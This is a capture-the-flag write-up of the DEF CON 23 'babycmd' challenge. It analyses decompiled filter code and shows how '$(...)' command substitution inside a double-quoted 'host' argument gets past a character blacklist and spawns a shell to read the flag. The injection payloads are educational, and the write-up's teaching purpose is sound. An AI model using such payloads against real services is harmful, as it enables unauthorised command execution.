---
title: "DEF CON 23 CTF Qualifier: babycmd"
date: 2015-05-15
description: "DEF CON 23 babycmd writeup: command injection via blacklist bypass, 64-bit Linux binary, shell escaping techniques"
tags: ["DEF CON", "CTF", "command-injection", "pwn", "64-bit", "bypass"]
platform: "ctf"
category: "pwn"
difficulty: "medium"
categories: ["CTF"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## checksec

```
[*] '/mnt/c/Users/user/Desktop/pwnable/babycmd'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

A stack canary and NX rule out classic stack overflows and shellcode injection. The vulnerability is at the application logic layer — command injection through an improperly sanitized shell command template.

## Program Execution

```
➜  pwnable ./babycmd

Welcome to another Baby's First Challenge!
Commands: ping, dig, host, exit
: ping 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=116 time=37.6 ms
...

Commands: ping, dig, host, exit
: dig google.com
...

Commands: ping, dig, host, exit
: host google.com
google.com has address 172.217.26.238
...
```

The binary accepts four commands: `ping`, `dig`, `host`, and `exit`. Each wraps the corresponding system utility via `popen`. The challenge is to inject an arbitrary shell command through one of these wrappers.

## Analysis

### Input reading and command dispatch

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char v9[272];   // [rsp+0h]  [rbp-258h]  — raw input buffer
  char dest[264]; // [rsp+110h] [rbp-148h] — command name

  ...
  while ( 1 )
  {
    printcmd_D3A();
    // read up to 255 bytes into v9
    ...
    v6 = strcspn(v9, " ");  // find first space
    strncpy(dest, v9, v6);  // copy command name
    dest[v6] = 0;

    cmd = strchr(v9, ' ');  // pointer to arguments (after space)
    if ( !strcasecmp(dest, "ping") )  ping_E35(cmd);
    else if ( !strcasecmp(dest, "dig") )   dig_F5C(cmd);
    else if ( !strcasecmp(dest, "host") )  host_10BD(cmd);
  }
}
```

### Blacklist filter — `check_D65`

All three handlers call `check_D65` before constructing the shell command. It copies each character from the user argument into a sanitized buffer, but returns 0 (fail) for any of the following characters:

```c
__int64 __fastcall check_D65(char *cmd, _BYTE *a2)
{
  ...
  while ( v2 == ' ' ) { ... }          // skip leading spaces
  if ( (unsigned __int8)(v2 - '&') <= 1u ) return 0;  // & and '
  if ( v2 == '|' )   return 0;
  if ( v2 == '*' )   return 0;
  if ( (v2 & 253) == '!' ) return 0;   // ! and #
  if ( (unsigned __int8)(v2 - ':') > 1u )
  {
    *a2++ = v2;  // character passes — copy it
    goto LABEL_9;
  }
  return 0;  // ; and :
}
```

Blocked: `&`, `'`, `|`, `*`, `!`, `#`, `;`, `:`

Notably, `$` and backtick `` ` `` are **not** blocked.

### `ping` handler

```c
if ( inet_aton(cp, &in) )  // validates IPv4 format
{
  __sprintf_chk(command, 1LL, 384LL, "ping -c 3 -W 3 %s", v1);
```

`inet_aton` strictly validates IPv4 dotted-decimal notation. No injection is possible here.

### `dig` handler

```c
__sprintf_chk(command, 1LL, 384LL, "dig '%s'", cp);
```

The argument is wrapped in **single quotes**. Inside single quotes, the shell treats everything literally — `$()` and backtick substitution are not expanded. No injection.

### `host` handler

```c
__sprintf_chk(command, 1LL, 384LL, "host \"%s\"", cp);
```

The argument is wrapped in **double quotes**. Inside double quotes, the shell still expands `$()` and `` `...` `` command substitutions. This is the injection point.

### Secondary filter — `check2_DCC`

For non-IP arguments, `dig` and `host` additionally call `check2_DCC`, which validates:
- Total argument length ≤ 63 characters
- First character must be alphanumeric
- Last character must be alphanumeric

```c
_BOOL8 __fastcall check2_DCC(const char *cmd)
{
  length = strlen(cmd) + 1;
  if ( length - 4 <= 60 )  // length ≤ 63
  {
    if ( isalpha(*cmd) || isdigit(*cmd) )  // first char alphanumeric
    {
      v3 = cmd[length - 2];
      if ( isalpha(v3) || isdigit(v3) )   // last char alphanumeric
        return 1;
    }
  }
  return 0;
}
```

Our payload must therefore start and end with an alphanumeric character.

## Command Substitution Background

The shell supports two forms of command substitution:

```bash
echo $(echo $(ls))     # dollar-paren — nesting works cleanly
echo `echo \`ls\``     # backtick — nesting requires escaping
echo `echo `ls``       # broken — inner backtick closes outer
```

Since `$` passes the blacklist and parentheses are not blocked, `$(...)` is the reliable choice.

## Exploitation

### Step 1 — Confirm injection

```
: host nt.ph4nt0m$(ls).xyz
Host nt.ph4nt0mDescription.md
babycmd
babycmd.id0
...
flag
...
horcruxes.xyz not found: 3(NXDOMAIN)
```

The output of `ls` is interpolated into the hostname. Commands execute.

### Step 2 — Read the flag directly

Trying `$(cat flag)` fails because the shell concatenates the command name with the argument without a space:

```
: host nt.ph4nt0m.$(cat flag)xyz
sh: 1: catflag: not found
```

The injected output becomes part of the hostname token. We need a command that opens a full interactive shell so we can issue commands with proper spacing.

### Step 3 — Spawn a shell via `$(sh)`

```
: host nt.ph4nt0m$(sh).xyz
cat flag
exit
Host nt.ph4nt0m[+] Exploit Success.xyz not found: 3(NXDOMAIN)
```

`$(sh)` spawns an interactive `/bin/sh` as a subshell inside the `popen` call. We type `cat flag` and `exit`, and the flag is embedded in the resulting hostname string that `host` tries to resolve.

## Payload Breakdown

```
host nt.ph4nt0m$(sh).xyz
       ^^^^^^^^           — alphanumeric prefix (satisfies check2_DCC first-char rule)
               ^^^^       — $() command substitution, not blocked by check_D65
                   ^^^^   — alphanumeric suffix (satisfies check2_DCC last-char rule)
```

The final shell command constructed by the binary:

```bash
host "nt.ph4nt0m$(sh).xyz"
```

The double-quote context allows `$(sh)` to expand, spawning a shell that reads our subsequent `cat flag`.

## Summary

`babycmd` demonstrates that blacklist-based input sanitization is fragile. The filter correctly blocked obvious metacharacters (`|`, `;`, `&`) but missed `$` — the key for `$(...)` command substitution. The `dig` handler was safe because single quotes prevent all substitution, while `host` used double quotes, which still expand `$()`. The secondary length and alphanumeric-boundary check was easily satisfied by wrapping the substitution between benign hostname fragments.
